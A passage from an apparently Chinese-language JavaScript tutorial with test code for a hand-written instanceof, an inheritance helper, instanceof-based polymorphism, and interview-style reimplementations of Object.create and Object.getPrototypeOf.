<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试3 - 数组 instanceof Object:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(arr, <span class="hljs-title class_">Object</span>)); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 测试4: 函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">testFunc</span>(<span class="hljs-params"/>) {}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试4 - 函数:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(testFunc, <span class="hljs-title class_">Function</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试4 - 函数 instanceof Object:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(testFunc, <span class="hljs-title class_">Object</span>)); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 测试5: 内置对象</span>
<span class="hljs-keyword">const</span> date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试5 - Date:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(date, <span class="hljs-title class_">Date</span>));         <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试5 - Date instanceof Object:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(date, <span class="hljs-title class_">Object</span>)); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 测试6: 原型链继承</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params"/>) {}
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Dog</span>;

<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试6 - 原型链:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(dog, <span class="hljs-title class_">Dog</span>));         <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试6 - 原型链:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(dog, <span class="hljs-title class_">Animal</span>));      <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试6 - 原型链:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(dog, <span class="hljs-title class_">Object</span>));      <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 测试7: 错误情况</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-title function_">myInstanceofComplete</span>({}, <span class="hljs-literal">null</span>);
} <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试7 - 非函数:'</span>, error.<span class="hljs-property">message</span>); <span class="hljs-comment">// 'Right-hand side of instanceof is not callable'</span>
}

<span class="hljs-keyword">try</span> {
    <span class="hljs-title function_">myInstanceofComplete</span>({}, {<span class="hljs-attr">prototype</span>: <span class="hljs-literal">null</span>});
} <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试7 - 非函数2:'</span>, error.<span class="hljs-property">message</span>); <span class="hljs-comment">// 'Right-hand side of instanceof is not callable'</span>
}
</code></pre>
<h5 data-id="heading-15">4.3 测试用例</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'=== 完整测试用例 ==='</span>);

<span class="hljs-comment">// 复杂原型链测试</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">GrandParent</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params"/>) {}

<span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">GrandParent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Parent</span>;

<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Child</span>;

<span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'原型链测试 - child instanceof Child:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(child, <span class="hljs-title class_">Child</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'原型链测试 - child instanceof Parent:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(child, <span class="hljs-title class_">Parent</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'原型链测试 - child instanceof GrandParent:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(child, <span class="hljs-title class_">GrandParent</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'原型链测试 - child instanceof Object:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(child, <span class="hljs-title class_">Object</span>)); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// Symbol.hasInstance 测试</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomClass</span> {
    <span class="hljs-keyword">static</span> [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">hasInstance</span>](instance) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> instance === <span class="hljs-string">'object'</span> &amp;&amp; instance.<span class="hljs-property">isCustom</span> === <span class="hljs-literal">true</span>;
    }
}

<span class="hljs-keyword">const</span> customObj = { <span class="hljs-attr">isCustom</span>: <span class="hljs-literal">true</span> };
<span class="hljs-keyword">const</span> notCustomObj = { <span class="hljs-attr">isCustom</span>: <span class="hljs-literal">false</span> };

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Symbol.hasInstance 测试 - 自定义对象:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(customObj, <span class="hljs-title class_">CustomClass</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Symbol.hasInstance 测试 - 非自定义对象:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(notCustomObj, <span class="hljs-title class_">CustomClass</span>)); <span class="hljs-comment">// false</span>

<span class="hljs-comment">// 边界情况：Object.create(null)</span>
<span class="hljs-keyword">const</span> objWithoutProto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Object.create(null) 测试:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(objWithoutProto, <span class="hljs-title class_">Object</span>)); <span class="hljs-comment">// false</span>

<span class="hljs-comment">// 边界情况：修改原型链</span>
<span class="hljs-keyword">const</span> obj = {};
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'修改原型链测试:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(obj, <span class="hljs-title class_">Array</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'修改原型链测试:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(obj, <span class="hljs-title class_">Object</span>)); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 边界情况：循环引用（应避免这种情况）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">A</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">B</span>(<span class="hljs-params"/>) {}

<span class="hljs-comment">// 设置循环原型链（不推荐，仅用于测试）</span>
<span class="hljs-keyword">const</span> a = <span class="hljs-keyword">new</span> <span class="hljs-title function_">A</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title function_">B</span>();

<span class="hljs-comment">// 注意：实际中不要这样做，这里只是为了测试</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(A.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, B.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(B.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, A.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);

<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 这里可能会陷入无限循环，所以我们需要有保护机制</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'循环引用测试:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(a, B));
} <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'循环引用测试 - 捕获错误:'</span>, error.<span class="hljs-property">message</span>);
}
</code></pre>
<h4 data-id="heading-16">五、new和instanceof的综合应用</h4>
<h5 data-id="heading-17">5.1 实现一个继承系统</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用 new 和 instanceof 实现完整的继承系统</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">inherit</span>(<span class="hljs-params">Child, Parent</span>) {
  <span class="hljs-comment">// 1. 创建中间构造函数，避免直接修改 Child.prototype</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">Temp</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {};
  <span class="hljs-title class_">Temp</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;

  <span class="hljs-comment">// 2. 设置 Child 的原型为 Parent 的实例</span>
  <span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Temp</span>();

  <span class="hljs-comment">// 3. 修复 constructor 指向</span>
  <span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Child</span>;

  <span class="hljs-comment">// 4. 设置 superClass 引用，便于调用父类方法</span>
  <span class="hljs-title class_">Child</span>.<span class="hljs-property">superClass</span> = <span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;

  <span class="hljs-comment">// 5. 如果父类的原型是 Object，需要额外处理</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Object</span>) {
    <span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Parent</span>;
  }
}

<span class="hljs-comment">// 测试继承系统</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Shape</span>(<span class="hljs-params">color</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
}

<span class="hljs-title class_">Shape</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getColor</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span>;
};

<span class="hljs-title class_">Shape</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getArea</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"getArea() must be implemented by subclasses"</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Circle</span>(<span class="hljs-params">color, radius</span>) {
  <span class="hljs-comment">// 调用父类构造函数</span>
  <span class="hljs-title class_">Shape</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, color);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">radius</span> = radius;
}

<span class="hljs-comment">// 继承 Shape</span>
<span class="hljs-title function_">inherit</span>(<span class="hljs-title class_">Circle</span>, <span class="hljs-title class_">Shape</span>);

<span class="hljs-comment">// 添加子类方法</span>
<span class="hljs-title class_">Circle</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getArea</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> * <span class="hljs-variable language_">this</span>.<span class="hljs-property">radius</span> * <span class="hljs-variable language_">this</span>.<span class="hljs-property">radius</span>;
};

<span class="hljs-title class_">Circle</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getCircumference</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> * <span class="hljs-variable language_">this</span>.<span class="hljs-property">radius</span>;
};

<span class="hljs-comment">// 测试</span>
<span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Circle</span>(<span class="hljs-string">"red"</span>, <span class="hljs-number">5</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"继承测试 - color:"</span>, circle.<span class="hljs-title function_">getColor</span>()); <span class="hljs-comment">// red</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"继承测试 - area:"</span>, circle.<span class="hljs-title function_">getArea</span>().<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>)); <span class="hljs-comment">// 78.54</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"继承测试 - circumference:"</span>, circle.<span class="hljs-title function_">getCircumference</span>().<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>)); <span class="hljs-comment">// 31.42</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"继承测试 - instanceof Circle:"</span>, circle <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Circle</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"继承测试 - instanceof Shape:"</span>, circle <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Shape</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"继承测试 - instanceof Object:"</span>, circle <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>); <span class="hljs-comment">// true</span>
</code></pre>
<h5 data-id="heading-18">5.2 实现多态检测</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用 instanceof 实现多态类型检测</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    }
    
    <span class="hljs-title function_">speak</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> makes a noise.`</span>);
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
    <span class="hljs-title function_">speak</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> barks.`</span>);
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
    <span class="hljs-title function_">speak</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> meows.`</span>);
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Bird</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
    <span class="hljs-title function_">speak</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> chirps.`</span>);
    }
}

<span class="hljs-comment">// 多态处理器</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AnimalHandler</span> {
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">animal</span>) {
        <span class="hljs-keyword">if</span> (animal <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Dog</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Handling a dog named <span class="hljs-subst">${animal.name}</span>`</span>);
            animal.<span class="hljs-title function_">speak</span>();
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Taking the dog for a walk...'</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (animal <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Cat</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Handling a cat named <span class="hljs-subst">${animal.name}</span>`</span>);
            animal.<span class="hljs-title function_">speak</span>();
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Giving the cat some milk...'</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (animal <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Bird</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Handling a bird named <span class="hljs-subst">${animal.name}</span>`</span>);
            animal.<span class="hljs-title function_">speak</span>();
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Letting the bird fly...'</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (animal <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Animal</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Handling an unknown animal named <span class="hljs-subst">${animal.name}</span>`</span>);
            animal.<span class="hljs-title function_">speak</span>();
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Providing general care...'</span>);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Not an animal!'</span>);
        }
    }
}

<span class="hljs-comment">// 测试多态</span>
<span class="hljs-keyword">const</span> animals = [
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">'Rex'</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">'Whiskers'</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bird</span>(<span class="hljs-string">'Tweety'</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>(<span class="hljs-string">'Generic'</span>),
    { <span class="hljs-attr">name</span>: <span class="hljs-string">'Not an animal'</span> }
];

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'=== 多态处理测试 ==='</span>);
animals.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">animal</span> =&gt;</span> {
    <span class="hljs-title class_">AnimalHandler</span>.<span class="hljs-title function_">handle</span>(animal);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'---'</span>);
});
</code></pre>
<h4 data-id="heading-19">六、常见面试题</h4>
<h5 data-id="heading-20">6.1 实现Object.create()</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * 手写 Object.create()
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Object</span>} proto 新创建对象的原型对象
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Object</span>} propertiesObject 可选，包含属性描述符的对象
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Object</span>} 新对象
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">myObjectCreate</span>(<span class="hljs-params">proto, propertiesObject</span>) {
    <span class="hljs-comment">// 参数验证</span>
    <span class="hljs-keyword">if</span> (proto !== <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-keyword">typeof</span> proto !== <span class="hljs-string">'object'</span> &amp;&amp; <span class="hljs-keyword">typeof</span> proto !== <span class="hljs-string">'function'</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Object prototype may only be an Object or null'</span>);
    }
    
    <span class="hljs-comment">// 创建一个空构造函数</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">Temp</span>(<span class="hljs-params"/>) {}
    
    <span class="hljs-comment">// 设置构造函数的原型</span>
    <span class="hljs-title class_">Temp</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = proto;
    
    <span class="hljs-comment">// 创建新对象</span>
    <span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Temp</span>();
    
    <span class="hljs-comment">// 如果 proto 是 null，手动设置原型为 null</span>
    <span class="hljs-keyword">if</span> (proto === <span class="hljs-literal">null</span>) {
        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, <span class="hljs-literal">null</span>);
    }
    
    <span class="hljs-comment">// 处理第二个参数</span>
    <span class="hljs-keyword">if</span> (propertiesObject !== <span class="hljs-literal">undefined</span>) {
        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperties</span>(obj, propertiesObject);
    }
    
    <span class="hljs-keyword">return</span> obj;
}

<span class="hljs-comment">// 测试 myObjectCreate</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'=== 测试 myObjectCreate ==='</span>);

<span class="hljs-comment">// 测试1: 基本功能</span>
<span class="hljs-keyword">const</span> proto = { <span class="hljs-attr">x</span>: <span class="hljs-number">10</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">20</span> };
<span class="hljs-keyword">const</span> obj1 = <span class="hljs-title function_">myObjectCreate</span>(proto);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试1 - 原型链:'</span>, <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj1) === proto); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试1 - 继承属性:'</span>, obj1.<span class="hljs-property">x</span>, obj1.<span class="hljs-property">y</span>); <span class="hljs-comment">// 10, 20</span>

<span class="hljs-comment">// 测试2: null 原型</span>
<span class="hljs-keyword">const</span> obj2 = <span class="hljs-title function_">myObjectCreate</span>(<span class="hljs-literal">null</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试2 - null 原型:'</span>, <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj2)); <span class="hljs-comment">// null</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试2 - 没有 toString:'</span>, obj2.<span class="hljs-property">toString</span> === <span class="hljs-literal">undefined</span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 测试3: 属性描述符</span>
<span class="hljs-keyword">const</span> obj3 = <span class="hljs-title function_">myObjectCreate</span>({}, {
    <span class="hljs-attr">value</span>: {
        <span class="hljs-attr">value</span>: <span class="hljs-number">42</span>,
        <span class="hljs-attr">writable</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>
    }
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试3 - 属性描述符:'</span>, obj3.<span class="hljs-property">value</span>); <span class="hljs-comment">// 42</span>
obj3.<span class="hljs-property">value</span> = <span class="hljs-number">100</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试3 - 不可写:'</span>, obj3.<span class="hljs-property">value</span>); <span class="hljs-comment">// 42 (不可写)</span>

<span class="hljs-comment">// 测试4: 与原生 Object.create 比较</span>
<span class="hljs-keyword">const</span> nativeObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(proto);
<span class="hljs-keyword">const</span> myObj = <span class="hljs-title function_">myObjectCreate</span>(proto);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试4 - 原生 vs 手写:'</span>, 
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(nativeObj) === <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(myObj)); <span class="hljs-comment">// true</span>
</code></pre>
<h5 data-id="heading-21">6.2 实现Object.getPrototypeOf()</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * 手写 Object.getPrototypeOf()
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Object</span>} obj 要获取原型的对象
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Object | null</span>} 对象的原型
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">myGetPrototypeOf</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-comment">// 参数验证</span>
  <span class="hljs-keyword">if</span> (obj === <span class="hljs-literal">null</span> || obj === <span class="hljs-literal">undefined</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"Cannot convert undefined or null to object"</span>);
  }

  <span class="hljs-comment">// 使用 __proto__ 访问器(非标准，但广泛支持)</span>
  <span class="hljs-comment">// 注意: 实际中更推荐使用 Object.getPrototypeOf</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-string">"__proto__"</span> <span class="hljs-keyword">in</span> obj) {
    <span class="hljs-keyword">return</span> obj.<span class="hljs-property">__proto__</span>;
  }

  <span class="hljs-comment">// 对于不支持 __proto__ 的环境，使用 Constructor 属性</span>
  <span class="hljs-comment">// 注意: 这种方法不可靠，因为 Constructor 可能被修改</span>
  <span class="hljs-keyword">if</span> (obj.<span class="hljs-property">constructor</span> &amp;&amp; obj.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) {
    <span class="hljs-keyword">return</span> obj.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;
  }

  <span class="hljs-comment">// 对于通过 Object.create(null) 创建的对象</span>
  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}

<span class="hljs-comment">// 测试 myGetPrototypeOf</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 测试 myGetPrototypeOf ==="</span>);

<span class="hljs-comment">// 测试1: 普通对象</span>
<span class="hljs-keyword">const</span> obj1 = {};
